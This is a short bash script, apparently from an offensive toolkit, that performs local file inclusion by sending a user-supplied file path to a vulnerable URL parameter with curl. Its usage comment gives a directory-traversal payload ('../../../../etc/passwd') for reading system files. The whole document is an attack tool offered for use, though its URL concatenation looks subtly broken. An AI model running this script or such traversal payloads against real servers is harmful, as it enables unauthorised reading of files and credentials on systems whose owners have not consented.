#!/bin/bash
# Local File Inclusion (LFI) - Including local files via a vulnerable parameter
# Options:
# <target_url> : URL with vulnerable parameter
# <file_path> : Path to local file to include

# Usage: lfi.sh <target_url> <file_path>
# Example script
# lfi.sh "http://example.com/vuln.php?file=1" "../../../../etc/passwd"

# Ensure parameters are provided
if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <target_url> <file_path>"
    exit 1
fi

TARGET_URL=$1
FILE_PATH=$2

echo "Starting local file inclusion on $TARGET_URL with file path $FILE_PATH"

# Perform local file inclusion
curl "$TARGET_URL=$FILE_PATH"

echo "Local file inclusion completed."
